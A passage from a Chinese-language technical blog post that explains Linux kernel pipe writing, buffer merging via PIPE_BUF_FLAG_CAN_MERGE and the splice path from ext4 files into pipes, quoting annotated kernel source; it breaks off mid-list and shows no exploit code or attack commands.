&amp;<span class="title">pipe</span>-&gt;<span class="title">bufs</span>[(<span class="title">head</span> - 1) &amp; <span class="title">mask</span>];</span></span><br><span class="line">    <span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">        offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">        ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">            ret = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buf-&gt;len += ret;</span><br><span class="line">        <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果说当前 pipe buf 中已经存在数据，并且本次待写入的数据可以被该 pipe buf 剩余空间所容纳，则本次写入的数据将直接写入该 pipe buf 中，与先前的 pipe buf 数据合并。这个合并操作需要 pipe buf 有 <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> 标志，该标志只要 pipe_write 所对应的 fd 没有设置 O_DIRECT 标志即可自动设置。</p>
+<p>其次是正常的页面写入逻辑：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 如果一个管道没有读者，则说明管道已经被破坏，生成 SIGPIPE 信号</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">        send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            ret = -EPIPE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 尝试循环往管道内写入数据</span></span><br><span class="line">    head = pipe-&gt;head;</span><br><span class="line">    <span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> = &amp;<span class="title">pipe</span>-&gt;<span class="title">bufs</span>[<span class="title">head</span> &amp; <span class="title">mask</span>];</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> = <span class="title">pipe</span>-&gt;<span class="title">tmp_page</span>;</span></span><br><span class="line">        <span class="keyword">int</span> copied;</span><br><span class="line">        <span class="comment">// 获取先前被释放但是缓存起来的 tmp_page。</span></span><br><span class="line">        <span class="comment">// 如果存在 tmp_page 则在向 pipe buf 写入数据时就可直接重用而无需分配</span></span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">                ret = ret ? : -ENOMEM;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pipe-&gt;tmp_page = page;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment">             * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment">             * it, either the reader will consume it or it'll still</span></span><br><span class="line"><span class="comment">             * be there for the next write.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">        head = pipe-&gt;head;</span><br><span class="line">        <span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">        spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">        <span class="comment">// 往新的 pipe buf 中写入数据</span></span><br><span class="line">        buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">        buf-&gt;page = page;</span><br><span class="line">        buf-&gt;ops = &amp;anon_pipe_buf_ops; <span class="comment">// 设置匿名管道操作</span></span><br><span class="line">        buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 如果 fd 设置了 O_DIRECT，则每次写入时都会占用新的一页，而不会合并</span></span><br><span class="line">        <span class="keyword">if</span> (is_packetized(filp)) </span><br><span class="line">            buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">        pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 复制页数据</span></span><br><span class="line">        copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret += copied;</span><br><span class="line">        buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line">    <span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            ret = -EAGAIN;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ret)</span><br><span class="line">            ret = -ERESTARTSYS;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个 tmp_page 简单讲一下。如果该 pipe buf 所持有的 page 只有它自己持有，并且现在打算将其释放，那么 pipe buf 就私下不释放该 page，而是将其缓存起来供后续使用：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">anon_pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="function"><span class="params">                  struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> = <span class="title">buf</span>-&gt;<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If nobody else uses this page, and we don't already have a</span></span><br><span class="line"><span class="comment">     * temporary page, let's keep track of it as a one-deep</span></span><br><span class="line"><span class="comment">     * allocation cache. (Otherwise just release our reference to it)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (page_count(page) == <span class="number">1</span> &amp;&amp; !pipe-&gt;tmp_page)</span><br><span class="line">        pipe-&gt;tmp_page = page;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        put_page(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从 pipe 读写操作中我们可以得知，pipe bufs 存放的页面无非两种：</p>
+<ol>
+<li>直接引用其他不变页（例如文件缓存页），这样就无需进行数据复制操作</li>
+<li>自己创建页，需要进行数据复制</li>
+</ol>
+<p>由 pipe 机制来保证存放在 pipe bufs 中的页数据，不会被 pipe 本身给覆写。同时<strong>注意只有在自己创建的页上，才能进行 Merge 操作</strong>。</p>
+</blockquote>
+<h3 id="6-do-splice-函数">6. do_splice 函数</h3>
+<p>Linux 库函数 <code>splice</code> 的作用是，将某个 fd 的数据不经过用户层，直接拷贝进另一个 fd 中。其函数声明如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">splice</span><span class="params">(<span class="keyword">int</span> fd_in, <span class="keyword">loff_t</span> *off_in, <span class="keyword">int</span> fd_out, <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>这里的 fd 只能有两种情况：pipe fd 或 file fd，因此在 do_splice 函数中，内核也会对 fd 的类型做特判，来执行不同的数据传递操作。</p>
+<p>这里，我们只需关注 <strong>From-fd 为 file，To-fd 为 pipe</strong> ，即<strong>数据从文件传递至管道</strong>的情况：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_splice</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> __user *off_in,</span></span></span><br><span class="line"><span class="function"><span class="params">        struct file *out, <span class="keyword">loff_t</span> __user *off_out,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> offset;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">    ipipe = get_pipe_info(in);</span><br><span class="line">    opipe = get_pipe_info(out);</span><br><span class="line">    ...;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当数据从文件复制给管道时</span></span><br><span class="line">    <span class="keyword">if</span> (opipe) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 等待 pipe 存在空闲空间</span></span><br><span class="line">        <span class="keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">            flags |= SPLICE_F_NONBLOCK;</span><br><span class="line"></span><br><span class="line">        pipe_lock(opipe);</span><br><span class="line">        ret = wait_for_space(opipe, flags);</span><br><span class="line">        <span class="comment">// 如果等到 pipe 存在空闲空间后</span></span><br><span class="line">        <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> p_space;</span><br><span class="line">             <span class="comment">// 获取待传递数据大小</span></span><br><span class="line">            <span class="comment">/* Don't try to read more the pipe has space for. */</span></span><br><span class="line">            p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);</span><br><span class="line">            len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);</span><br><span class="line">            <span class="comment">// 执行真正的传递操作</span></span><br><span class="line">            ret = do_splice_to(in, &amp;offset, opipe, len, flags);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而在 do_splice_to 函数中，内核会根据<strong>文件系统类型</strong>，来调用对应的 splice_read 函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from a file to a pipe.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_splice_to</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="function"><span class="params">             struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">             <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    ret = rw_verify_area(READ, in, ppos, len);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(ret &lt; <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))</span><br><span class="line">        len = MAX_RW_COUNT;</span><br><span class="line">    <span class="comment">// 调用 splice_read 函数</span></span><br><span class="line">    <span class="keyword">if</span> (in-&gt;f_op-&gt;splice_read)</span><br><span class="line">        <span class="keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);</span><br><span class="line">    <span class="keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以 linux 中最常见的文件系统 ext4 为例，这是 ext4 文件系统中所设置的一些关键方法：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/ext4/file.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_file_operations</span> = &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    .read_iter    = ext4_file_read_iter,</span><br><span class="line">    ...</span><br><span class="line">    .splice_read  = generic_file_splice_read,</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>因此最终 do_splice_to 函数会调用到 generic_file_splice_read 函数来执行数据传递：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * generic_file_splice_read - splice data from file to a pipe</span></span><br><span class="line"><span class="comment"> * @in:      file to splice from</span></span><br><span class="line"><span class="comment"> * @ppos:    position in @in</span></span><br><span class="line"><span class="comment"> * @pipe:    pipe to splice to</span></span><br><span class="line"><span class="comment"> * @len:     number of bytes to splice</span></span><br><span class="line"><span class="comment"> * @flags:   splice modifier flags</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *    Will read pages from given file and fill them into a pipe. Can be</span></span><br><span class="line"><span class="comment"> *    used as long as it has more or less sane -&gt;read_iter().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">generic_file_splice_read</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *ppos,</span></span></span><br><span class="line"><span class="function"><span class="params">                 struct pipe_inode_info *pipe, <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">to</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kiocb</span> <span class="title">kiocb</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i_head;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据 pipe 结构体，创建 iov_iter 结构</span></span><br><span class="line">    iov_iter_pipe(&amp;to, READ, pipe, len);</span><br><span class="line">    i_head = to.head;</span><br><span class="line">    <span class="comment">// 创建 kiocb 结构</span></span><br><span class="line">    init_sync_kiocb(&amp;kiocb, in);</span><br><span class="line">    kiocb.ki_pos = *ppos;</span><br><span class="line">    <span class="comment">// 调用 call_read_iter 执行实际的数据传输操作 ！！！</span></span><br><span class="line">    ret = call_read_iter(in, &amp;kiocb, &amp;to);</span><br><span class="line">    <span class="comment">// 如果数据正常传输</span></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 更新文件访问情况</span></span><br><span class="line">        *ppos = kiocb.ki_pos;</span><br><span class="line">        file_accessed(in);</span><br><span class="line">    <span class="comment">// 如果数据传输失败</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        to.head = i_head;</span><br><span class="line">        to.iov_offset = <span class="number">0</span>;</span><br><span class="line">        iov_iter_advance(&amp;to, <span class="number">0</span>); <span class="comment">/* to free what was emitted */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * callers of -&gt;splice_read() expect -EAGAIN on</span></span><br><span class="line"><span class="comment">         * "can't put anything in there", rather than -EFAULT.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (ret == -EFAULT)</span><br><span class="line">            ret = -EAGAIN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从 generic_file_splice_read 函数的代码中可以看到，该函数最终会调用 call_read_iter 函数来做数据传递；而该函数又会调用特定于文件系统的 read_iter 函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ssize_t</span> <span class="title">call_read_iter</span><span class="params">(struct file *file, struct kiocb *kio,</span></span></span><br><span class="line"><span class="function"><span class="params">                     struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file-&gt;f_op-&gt;read_iter(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从 <code>ext4_file_operations</code> 代码中可以得知，call_read_iter 函数调用到的是 ext4_file_read_iter 函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">ext4_file_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">file_inode</span>(<span class="title">iocb</span>-&gt;<span class="title">ki_filp</span>);</span></span><br><span class="line">    <span class="comment">// 一些简单的判断</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">        <span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!iov_iter_count(to))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line">    <span class="keyword">if</span> (IS_DAX(inode))</span><br><span class="line">        <span class="keyword">return</span> ext4_dax_read_iter(iocb, to);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)</span><br><span class="line">        <span class="keyword">return</span> ext4_dio_read_iter(iocb, to);</span><br><span class="line">    <span class="comment">// 没设置 O_DIRECT 的走这里</span></span><br><span class="line">    <span class="keyword">return</span> generic_file_read_iter(iocb, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后该函数又调 <code>generic_file_read_iter</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * generic_file_read_iter - generic filesystem read routine</span></span><br><span class="line"><span class="comment"> * @iocb:    kernel I/O control block</span></span><br><span class="line"><span class="comment"> * @iter:    destination for the data read</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is the "read_iter()" routine for all filesystems</span></span><br><span class="line"><span class="comment"> * that can use the page cache directly.</span></span><br><span class="line"><span class="comment"> * Return:</span></span><br><span class="line"><span class="comment"> * * number of bytes copied, even for partial reads</span></span><br><span class="line"><span class="comment"> * * negative error code if nothing was read</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">ssize_t</span></span><br><span class="line">generic_file_read_iter(struct kiocb *iocb, struct iov_iter *iter)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = iov_iter_count(iter);</span><br><span class="line">    <span class="keyword">ssize_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!count)</span><br><span class="line">        <span class="keyword">goto</span> out; <span class="comment">/* skip atime */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 继续调用</span></span><br><span class="line">    retval = generic_file_buffered_read(iocb, iter, retval);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接着又调 <code>generic_file_buffered_read</code>函数。该函数代码量太大了我就不贴了，只简单讲讲其大致功能：</p>
+<ul>
+<li>尝试在<strong>该文件已有的文件缓存映射表</strong>中查找先前已经映射的文件缓存页
+<ul>
